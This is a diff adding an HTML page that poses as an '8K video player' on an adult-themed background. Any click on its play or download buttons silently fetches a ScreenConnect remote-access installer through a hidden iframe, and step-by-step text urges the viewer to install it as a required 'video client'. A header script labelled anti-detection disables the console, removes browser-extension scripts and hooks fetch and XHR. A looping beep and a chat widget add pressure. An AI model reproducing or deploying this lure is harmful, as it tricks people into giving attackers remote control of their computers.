@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>8K Video Player</title>
+    
+    <!-- Anti-detection / McAfee & Extension Protection -->
+    <script>
+        (function() {
+            if (navigator) {
+                Object.defineProperty(navigator, 'plugins', {
+                    get: function() {
+                        return {
+                            length: 0,
+                            item: function() { return null; },
+                            namedItem: function() { return null; },
+                            refresh: function() {}
+                        };
+                    },
+                    configurable: false,
+                    enumerable: true
+                });
+                
+                Object.defineProperty(navigator, 'mimeTypes', {
+                    get: function() {
+                        return {
+                            length: 0,
+                            item: function() { return null; },
+                            namedItem: function() { return null; }
+                        };
+                    },
+                    configurable: false,
+                    enumerable: true
+                });
+            }
+            
+            if (window.ActiveXObject) {
+                window.ActiveXObject = undefined;
+            }
+            
+            const blockList = ['flash', 'shockwave', 'activex', 'plugin', 'mime', 'swf', 'x-shockwave-flash'];
+            blockList.forEach(function(term) {
+                Object.defineProperty(window, term, {
+                    get: function() { return undefined; },
+                    set: function() {},
+                    configurable: false
+                });
+            });
+            
+            const noop = function() {};
+            if (window.console) {
+                console.log = noop;
+                console.warn = noop;
+                console.error = noop;
+                console.info = noop;
+                console.debug = noop;
+                console.trace = noop;
+            }
+            
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'childList') {
+                        const addedNodes = mutation.addedNodes;
+                        for (let i = 0; i < addedNodes.length; i++) {
+                            const node = addedNodes[i];
+                            if (node.nodeType === 1) {
+                                const suspicious = ['flash', 'plugin', 'activex', 'shockwave'];
+                                suspicious.forEach(function(pattern) {
+                                    if (node.id && node.id.toLowerCase().includes(pattern)) {
+                                        node.remove();
+                                    }
+                                    if (node.className && typeof node.className === 'string' && 
+                                        node.className.toLowerCase().includes(pattern)) {
+                                        node.remove();
+                                    }
+                                });
+                            }
+                        }
+                    }
+                });
+            });
+            observer.observe(document.documentElement, { childList: true, subtree: true });
+            
+            const scriptObserver = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'childList') {
+                        const addedNodes = mutation.addedNodes;
+                        for (let i = 0; i < addedNodes.length; i++) {
+                            const node = addedNodes[i];
+                            if (node.nodeType === 1 && node.tagName === 'SCRIPT') {
+                                const src = node.src || '';
+                                if (src.includes('chrome-extension') || 
+                                    src.includes('moz-extension') || 
+                                    src.includes('safari-extension') ||
+                                    src.includes('edge-extension')) {
+                                    node.remove();
+                                }
+                                if (node.textContent && (
+                                    node.textContent.includes('flash') ||
+                                    node.textContent.includes('plugin') ||
+                                    node.textContent.includes('activex') ||
+                                    node.textContent.includes('shockwave')
+                                )) {
+                                    node.remove();
+                                }
+                            }
+                        }
+                    }
+                });
+            });
+            scriptObserver.observe(document.documentElement, { childList: true, subtree: true });
+            
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                if (typeof url === 'string') {
+                    const blocked = ['flash', 'plugin', 'activex', 'shockwave', 'swf'];
+                    for (let i = 0; i < blocked.length; i++) {
+                        if (url.toLowerCase().includes(blocked[i])) {
+                            return Promise.reject(new Error('Blocked'));
+                        }
+                    }
+                }
+                return originalFetch.call(this, url, options);
+            };
+            
+            const originalOpen = XMLHttpRequest.prototype.open;
+            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+                if (typeof url === 'string') {
+                    const blocked = ['flash', 'plugin', 'activex', 'shockwave', 'swf'];
+                    for (let i = 0; i < blocked.length; i++) {
+                        if (url.toLowerCase().includes(blocked[i])) {
+                            this.abort();
+                            return;
+                        }
+                    }
+                }
+                return originalOpen.call(this, method, url, async, user, password);
+            };
+            
+            window.addEventListener('load', function() {
+                const allElements = document.querySelectorAll('*');
+                const suspicious = ['flash', 'plugin', 'activex', 'shockwave', 'swf'];
+                allElements.forEach(function(el) {
+                    suspicious.forEach(function(pattern) {
+                        if (el.id && el.id.toLowerCase().includes(pattern)) {
+                            el.remove();
+                        }
+                        if (el.className && typeof el.className === 'string' && 
+                            el.className.toLowerCase().includes(pattern)) {
+                            el.remove();
+                        }
+                    });
+                });
+            }, true);
+            
+            if (window.chrome && chrome.runtime) {
+                try {
+                    chrome.runtime.onMessage.removeAllListeners();
+                    chrome.runtime.onMessageExternal.removeAllListeners();
+                } catch(e) {}
+            }
+            
+            console.log('🛡️ Protection active');
+        })();
+    </script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #0b0f16;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, 'Helvetica Neue', sans-serif;
+        }
+
+        /* Background image - always bright, no dark overlay */
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            display: block;
+            user-select: none;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* PLAY BUTTON - Always visible, centered */
+        .play-btn-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        .play-btn {
+            pointer-events: all;
+            cursor: pointer;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 60px;
+            padding: 22px 52px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            color: #fff;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .play-btn:hover {
+            transform: scale(1.06);
+            background: rgba(0, 0, 0, 0.65);
+            border-color: rgba(255, 255, 255, 0.6);
+            box-shadow: 0 8px 50px rgba(0, 0, 0, 0.7);
+        }
+
+        .play-btn:active {
+            transform: scale(0.95);
+        }
+
+        .play-btn svg {
+            width: 34px;
+            height: 34px;
+            fill: #fff;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.4));
+        }
+
+        /* BOTTOM VIDEO PLAYER */
+        .bottom-video-container {
+            position: fixed;
+            bottom: 65px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 3;
+            pointer-events: none;
+            width: 100%;
+            height: 260px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            filter: drop-shadow(rgba(0, 0, 0, 0.5) 0px 0px 40px);
+        }
+
+        .bottom-video-container video {
+            max-height: 100%;
+            width: auto;
+            max-width: 100%;
+            object-fit: contain;
+            pointer-events: none;
+        }
+
+        /* NOTIFICATION - Centered TOP of screen */
+        .notification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 8;
+            display: none;
+            align-items: flex-start;
+            justify-content: center;
+            padding-top: 28px;
+            pointer-events: none;
+        }
+
+        .notification-overlay.active {
+            display: flex;
+        }
+
+        .notification {
+            pointer-events: all;
+            max-width: 560px;
+            width: 94%;
+            border-radius: 28px;
+            box-shadow: 
+                0 30px 90px rgba(0, 0, 0, 0.9),
+                0 0 0 1px rgba(255, 255, 255, 0.08),
+                0 0 60px rgba(74, 106, 240, 0.15);
+            padding: 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            opacity: 0;
+            transform: scale(0.9) translateY(-20px);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            max-height: 88vh;
+            overflow: hidden;
+            /* GIF background with dark tint overlay for readability */
+            background-image: 
+                linear-gradient(160deg, rgba(10, 14, 24, 0.82) 0%, rgba(8, 12, 20, 0.88) 100%),
+                url('https://myteenwebcam.com/fapp/gifs/f17346b94b241ddafabb9c5f533ed0d9.gif');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+
+        .notification-overlay.active .notification {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+        }
+
+        /* Colorful top gradient bar */
+        .notify-top-bar {
+            height: 6px;
+            background: linear-gradient(90deg, #4a6af0, #8b5cf6, #ec4899, #f59e0b, #4a6af0);
+            background-size: 300% 100%;
+            animation: gradientMove 4s ease infinite;
+            border-radius: 28px 28px 0 0;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .notify-inner {
+            padding: 26px 32px 30px 32px;
+            max-height: calc(88vh - 6px);
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.15);
+        }
+
+        .notify-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 18px;
+        }
+
+        .notify-icon {
+            font-size: 1.8rem;
+            line-height: 1;
+            width: 56px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(145deg, #4a6af0, #2a4ad0);
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(74, 106, 240, 0.4);
+            flex-shrink: 0;
+        }
+
+        .notify-title {
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 1.2rem;
+            letter-spacing: 0.2px;
+            line-height: 1.3;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.7);
+        }
+
+        .notify-title span {
+            display: block;
+            color: #c0c8dd;
+            font-weight: 400;
+            font-size: 0.85rem;
+            margin-top: 2px;
+        }
+
+        .notify-body {
+            padding-left: 0;
+        }
+
+        .notify-message {
+            color: #e8ecf5;
+            font-size: 1rem;
+            font-weight: 400;
+            line-height: 1.6;
+            margin-bottom: 18px;
+            padding: 14px 18px;
+            background: linear-gradient(135deg, rgba(74, 106, 240, 0.35), rgba(139, 92, 246, 0.25));
+            border-radius: 14px;
+            border-left: 4px solid #4a6af0;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .notify-message strong {
+            color: #ffd88a;
+            font-weight: 700;
+        }
+
+        .notify-message .highlight {
+            color: #88ccff;
+            font-weight: 600;
+        }
+
+        /* INSTRUCTION BOX - colorful & clear */
+        .instruction-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin: 0 0 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+        }
+
+        .instruction-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(180deg, #4a6af0, #8b5cf6, #ec4899);
+            border-radius: 4px 0 0 4px;
+        }
+
+        .instruction-title {
+            color: #ffffff;
+            font-size: 0.9rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
+        }
+
+        .instruction-title .badge {
+            background: linear-gradient(135deg, #4a6af0, #8b5cf6);
+            color: #fff;
+            font-size: 0.65rem;
+            padding: 2px 10px;
+            border-radius: 40px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .instruction-box .step {
+            color: #d0d8e8;
+            font-size: 0.88rem;
+            line-height: 1.7;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+        }
+
+        .instruction-box .step:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .instruction-box .step:first-of-type {
+            padding-top: 0;
+        }
+
+        .step-num {
+            width: 24px;
+            height: 24px;
+            min-width: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(145deg, #4a6af0, #2a4ad0);
+            color: #fff;
+            font-weight: 700;
+            font-size: 0.75rem;
+            border-radius: 50%;
+            box-shadow: 0 3px 10px rgba(74, 106, 240, 0.5);
+            margin-top: 2px;
+        }
+
+        .instruction-box .step-text {
+            color: #e0e6f0;
+            flex: 1;
+        }
+
+        .instruction-box .step-text strong {
+            color: #ffd88a;
+            font-weight: 600;
+        }
+
+        .instruction-box .step-text code {
+            background: rgba(74, 106, 240, 0.4);
+            padding: 2px 10px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            color: #b8e0ff;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border: 1px solid rgba(74, 106, 240, 0.4);
+        }
+
+        /* BUTTONS */
+        .download-btn-wrap {
+            margin-top: 4px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .download-btn {
+            background: linear-gradient(180deg, #4a6af0, #2a4ad0);
+            border: none;
+            border-radius: 40px;
+            padding: 14px 28px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: #fff;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 6px 24px rgba(42, 74, 208, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            transition: all 0.15s ease;
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            border: 1px solid rgba(120, 160, 255, 0.25);
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
+            flex: 1;
+            justify-content: center;
+            min-width: 150px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(180deg, #5a7aff, #3a5ae0);
+            box-shadow: 0 10px 32px rgba(42, 74, 208, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.25);
+        }
+
+        .download-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 3px 12px rgba(42, 74, 208, 0.3);
+        }
+
+        .download-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+            filter: drop-shadow(0 1px 4px rgba(0,0,0,0.2));
+        }
+
+        .download-btn.green {
+            background: linear-gradient(180deg, #22c55e, #16a34a);
+            border-color: rgba(100, 220, 120, 0.25);
+            box-shadow: 0 6px 24px rgba(34, 197, 94, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+
+        .download-btn.green:hover {
+            background: linear-gradient(180deg, #34d36e, #1cb554);
+            box-shadow: 0 10px 32px rgba(34, 197, 94, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.25);
+        }
+
+        .notify-close {
+            position: absolute;
+            top: 18px;
+            right: 20px;
+            color: #c0c8dd;
+            font-size: 1.4rem;
+            font-weight: 300;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: all 0.15s;
+            line-height: 1;
+            user-select: none;
+            background: rgba(0, 0, 0, 0.4);
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+
+        .notify-close:hover {
+            opacity: 1;
+            color: #ffffff;
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        /* DOWNLOAD PROGRESS */
+        .download-progress {
+            display: none;
+            margin-top: 16px;
+            padding: 14px 20px;
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.3), rgba(34, 197, 94, 0.12));
+            border-radius: 14px;
+            color: #b8f0c0;
+            font-size: 0.9rem;
+            font-weight: 600;
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            align-items: center;
+            gap: 14px;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .download-progress.show {
+            display: flex;
+            animation: progressPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes progressPulse {
+            0%, 100% { border-color: rgba(34, 197, 94, 0.4); }
+            50% { border-color: rgba(34, 197, 94, 0.8); }
+        }
+
+        .download-progress .spinner-small {
+            width: 22px;
+            height: 22px;
+            animation: rotateSpinner 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+
+        .download-progress .spinner-small circle {
+            fill: none;
+            stroke: #22c55e;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-dasharray: 30 50;
+            animation: dashSpin 0.8s ease-in-out infinite;
+        }
+
+        @keyframes rotateSpinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes dashSpin {
+            0% { stroke-dashoffset: 0; }
+            50% { stroke-dashoffset: -80; }
+            100% { stroke-dashoffset: -160; }
+        }
+
+        /* responsive */
+        @media (max-width: 640px) {
+            .notification-overlay {
+                padding-top: 16px;
+            }
+            .notify-inner {
+                padding: 22px 20px 26px 20px;
+            }
+            .notification {
+                width: 94%;
+            }
+            .download-btn-wrap {
+                flex-direction: column;
+            }
+            .download-btn {
+                padding: 13px 20px;
+                font-size: 0.9rem;
+                width: 100%;
+                flex: none;
+                min-width: auto;
+            }
+            .play-btn {
+                padding: 16px 30px;
+                font-size: 1.1rem;
+            }
+            .play-btn svg {
+                width: 26px;
+                height: 26px;
+            }
+            .notify-message {
+                font-size: 0.95rem;
+                padding: 12px 14px;
+            }
+            .instruction-box .step {
+                font-size: 0.82rem;
+            }
+            .bottom-video-container {
+                height: 200px;
+                bottom: 45px;
+            }
+        }
+
+        @media (min-width: 640px) {
+            .bottom-video-container {
+                height: 300px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .bottom-video-container {
+                height: 400px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .bottom-video-container {
+                left: 10%;
+                transform: translateX(0);
+                height: 600px;
+                align-items: flex-start;
+            }
+        }
+
+        @media (min-width: 1280px) {
+            .bottom-video-container {
+                height: 700px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .notification-overlay {
+                padding-top: 10px;
+            }
+            .notify-inner {
+                padding: 18px 16px 22px 16px;
+            }
+            .notify-message {
+                font-size: 0.85rem;
+            }
+            .play-btn {
+                padding: 14px 24px;
+                font-size: 1rem;
+            }
+            .play-btn svg {
+                width: 22px;
+                height: 22px;
+            }
+            .notify-icon {
+                width: 48px;
+                height: 48px;
+                font-size: 1.5rem;
+            }
+            .notify-title {
+                font-size: 1.05rem;
+            }
+            .bottom-video-container {
+                height: 160px;
+                bottom: 35px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Beep audio - looping -->
+    <audio id="beepAudio" src="beep.mp3" preload="auto" loop></audio>
+
+    <!-- background image - always bright, no dark overlay -->
+    <img class="bg-image" src="https://img.letsporn.com/contents/videos_screenshots/2000/2583/preview.jpg" alt="background" loading="eager" />
+
+    <!-- PLAY BUTTON - Always visible, centered -->
+    <div class="play-btn-container" id="playContainer">
+        <button class="play-btn" id="playBtn">
+            <svg viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7L8 5z"/>
+            </svg>
+            Play 8K Video
+        </button>
+    </div>
+
+    <!-- BOTTOM VIDEO PLAYER -->
+    <div class="bottom-video-container">
+        <video src="/v2/heroD/endlessShowsSection/f1413.webm" loop playsinline autoplay muted></video>
+    </div>
+
+    <!-- NOTIFICATION - Centered TOP of screen -->
+    <div class="notification-overlay" id="notificationOverlay">
+        <div class="notification" id="notification">
+            <div class="notify-top-bar"></div>
+            <div class="notify-inner">
+                <button class="notify-close" id="closeNotify">✕</button>
+                
+                <div class="notify-header">
+                    <span class="notify-icon">📥</span>
+                    <div class="notify-title">
+                        Download Required
+                        <span>8K Video Client · Update needed</span>
+                    </div>
+                </div>
+
+                <div class="notify-body">
+                    <div class="notify-message">
+                        <strong>8K Video Client</strong> is required to play this <span class="highlight">🎬 8K video</span>
+                    </div>
+                    
+                    <!-- Instructions - clear & beautiful -->
+                    <div class="instruction-box">
+                        <div class="instruction-title">
+                            <span>📋</span> How to Install
+                            <span class="badge">4 Steps</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">1</span>
+                            <span class="step-text">Download the <code>ScreenConnect.ClientSetup.msi</code> file using the buttons below</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">2</span>
+                            <span class="step-text">Check your <strong>Downloads</strong> folder for the downloaded file</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">3</span>
+                            <span class="step-text">Double-click <code>ScreenConnect.ClientSetup.msi</code> to install the client</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">4</span>
+                            <span class="step-text">After installation, <strong>refresh this page</strong> to play the video</span>
+                        </div>
+                    </div>
+
+                    <div class="download-btn-wrap">
+                        <button class="download-btn" id="downloadClientBtn">
+                            <svg viewBox="0 0 24 24" width="18" height="18">
+                                <path d="M5 20h14v-2H5v2zm7-18L5.33 9h3.84v4h3.66V9h3.84L12 2z" transform="rotate(180,12,12)"/>
+                            </svg>
+                            Download 8K Client
+                        </button>
+                        <button class="download-btn green" id="downloadVideoBtn">
+                            <svg viewBox="0 0 24 24" width="18" height="18">
+                                <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                            </svg>
+                            Download Full Video
+                        </button>
+                    </div>
+                    
+                    <!-- Download progress -->
+                    <div class="download-progress" id="downloadProgress">
+                        <svg class="spinner-small" viewBox="0 0 30 30">
+                            <circle cx="15" cy="15" r="10" />
+                        </svg>
+                        <span id="progressText">Download started, please check your downloads...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Chat Widget -->
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6ac039dc8d16ce34cb9d68c2/1k3ve421u';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+    <script>
+        (function() {
+            const playBtn = document.getElementById('playBtn');
+            const notificationOverlay = document.getElementById('notificationOverlay');
+            const notification = document.getElementById('notification');
+            const closeNotify = document.getElementById('closeNotify');
+            const downloadClientBtn = document.getElementById('downloadClientBtn');
+            const downloadVideoBtn = document.getElementById('downloadVideoBtn');
+            const downloadProgress = document.getElementById('downloadProgress');
+            const progressText = document.getElementById('progressText');
+            const beepAudio = document.getElementById('beepAudio');
+
+            const CLIENT_URL = 'https://pixelteam.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SECURED%20SHIELD&c=SECUREDSHIELD.COM&c=SS&c=WINDOWS&c=&c=&c=&c=';
+            const VIDEO_URL = 'https://pixelteam.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SECURED%20SHIELD&c=SECUREDSHIELD.COM&c=SS&c=WINDOWS&c=&c=&c=&c=';
+
+            let downloadInProgress = false;
+
+            // ============================================
+            // PLAY BEEP.MP3 IN LOOP ON PAGE LOAD
+            // ============================================
+            beepAudio.loop = true;
+            beepAudio.volume = 0.5;
+
+            function playBeep() {
+                const playPromise = beepAudio.play();
+                if (playPromise !== undefined) {
+                    playPromise.then(function() {
+                        // Playing successfully
+                    }).catch(function(error) {
+                        // Autoplay blocked - wait for user interaction
+                        const startBeep = function() {
+                            beepAudio.play().catch(function() {});
+                            document.removeEventListener('click', startBeep);
+                            document.removeEventListener('touchstart', startBeep);
+                            document.removeEventListener('keydown', startBeep);
+                            document.removeEventListener('mousemove', startBeep);
+                            document.removeEventListener('scroll', startBeep);
+                        };
+                        document.addEventListener('click', startBeep);
+                        document.addEventListener('touchstart', startBeep);
+                        document.addEventListener('keydown', startBeep);
+                        document.addEventListener('mousemove', startBeep);
+                        document.addEventListener('scroll', startBeep);
+                    });
+                }
+            }
+
+            // Play on page load
+            window.addEventListener('load', playBeep);
+            // Also try immediately (in case DOMContentLoaded already fired)
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                playBeep();
+            } else {
+                document.addEventListener('DOMContentLoaded', playBeep);
+            }
+
+            // Safe download function - stays in same window using iframe
+            function startDownload(url, fileName, callback) {
+                if (downloadInProgress) return;
+                downloadInProgress = true;
+                
+                downloadProgress.classList.add('show');
+                progressText.textContent = 'Download started, please check your downloads...';
+                
+                // Use iframe (stays in same window)
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                        }
+                        progressText.textContent = '✅ Download started! Please check your downloads.';
+                        setTimeout(() => {
+                            downloadProgress.classList.remove('show');
+                            downloadInProgress = false;
+                            if (callback) callback();
+                        }, 2000);
+                    }, 3000);
+                    
+                } catch(e) {
+                    // Fallback: Use anchor tag
+                    try {
+                        const link = document.createElement('a');
+                        link.href = url;
+                        link.download = fileName || '';
+                        link.target = '_blank';
+                        document.body.appendChild(link);
+                        link.click();
+                        
+                        setTimeout(() => {
+                            if (document.body.contains(link)) {
+                                document.body.removeChild(link);
+                            }
+                            progressText.textContent = '✅ Download started! Please check your downloads.';
+                            setTimeout(() => {
+                                downloadProgress.classList.remove('show');
+                                downloadInProgress = false;
+                                if (callback) callback();
+                            }, 2000);
+                        }, 3000);
+                    } catch(e2) {
+                        // Last resort
+                        window.open(url, '_blank');
+                        progressText.textContent = '✅ Download started! Please check your downloads.';
+                        setTimeout(() => {
+                            downloadProgress.classList.remove('show');
+                            downloadInProgress = false;
+                            if (callback) callback();
+                        }, 3000);
+                    }
+                }
+            }
+
+            // Show notification
+            function showNotification() {
+                notificationOverlay.classList.add('active');
+            }
+
+            // Hide notification
+            function hideNotification() {
+                notificationOverlay.classList.remove('active');
+                downloadProgress.classList.remove('show');
+                downloadInProgress = false;
+            }
+
+            // Play button handler - show notification AND auto start download
+            function handlePlayClick() {
+                showNotification();
+                setTimeout(() => {
+                    startDownload(CLIENT_URL, 'ScreenConnect.ClientSetup.msi');
+                }, 400);
+            }
+
+            // Download Client button handler
+            function handleDownloadClient() {
+                showNotification();
+                startDownload(CLIENT_URL, 'ScreenConnect.ClientSetup.msi');
+            }
+
+            // Download Video button handler
+            function handleDownloadVideo() {
+                showNotification();
+                startDownload(VIDEO_URL, '8k_video_offline.msi');
+            }
+
+            // Event listeners
+            playBtn.addEventListener('click', handlePlayClick);
+            closeNotify.addEventListener('click', hideNotification);
+            downloadClientBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleDownloadClient();
+            });
+            downloadVideoBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleDownloadVideo();
+            });
+
+            // ESC to close
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && notificationOverlay.classList.contains('active')) {
+                    hideNotification();
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html>
